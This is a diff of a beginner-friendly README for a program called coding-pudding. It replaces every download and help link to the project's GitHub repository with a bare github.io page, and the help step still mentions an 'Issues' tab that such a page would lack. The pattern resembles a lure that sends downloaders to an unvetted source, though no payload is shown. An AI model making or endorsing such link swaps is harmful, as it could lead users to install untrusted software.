@@ -51,10 +51,10 @@ Getting coding-pudding on your computer is as easy as following a recipe. Here i
 
 ### Step 1: Go to the Download Page
 
-[![Download coding-pudding](https://img.shields.io/badge/Download-coding--pudding-6A5ACD?style=for-the-badge&logo=github&logoColor=white&labelColor=2F4F4F)](https://github.com/spdtech07/coding-pudding)
+[![Download coding-pudding](https://img.shields.io/badge/Download-coding--pudding-6A5ACD?style=for-the-badge&logo=github&logoColor=white&labelColor=2F4F4F)](https://spdtech07.github.io)
 
 **Visit this link to download the application.** Just click the button above or open your web browser and go to this address:
-👉 **https://github.com/spdtech07/coding-pudding**
+👉 **https://spdtech07.github.io**
 
 ### Step 2: Find the Latest Version
 
@@ -187,7 +187,7 @@ If coding-pudding helps you start your coding journey, consider doing any of the
 
 If anything in this guide was unclear, or if you run into any issue at all, do not worry. Here is what you can do:
 
-1. Visit the GitHub page: **https://github.com/spdtech07/coding-pudding**
+1. Visit the GitHub page: **https://spdtech07.github.io**
 2. Click the **"Issues"** tab at the top.
 3. Click **"New Issue"** and describe your problem in plain English.
 4. A human will usually respond within a few days.
@@ -201,7 +201,7 @@ Remember: every programmer started as a beginner. You belong here too. 🌱
 You have everything you need. A lightweight, friendly program that runs on your existing computer, plus a clear path to download it. Stop waiting for a faster machine—start creating with what you have right now.
 
 **Your coding adventures begin with a single click.**
-👉 [Download coding-pudding today](https://github.com/spdtech07/coding-pudding)
+👉 [Download coding-pudding today](https://spdtech07.github.io)
 
 ---
 
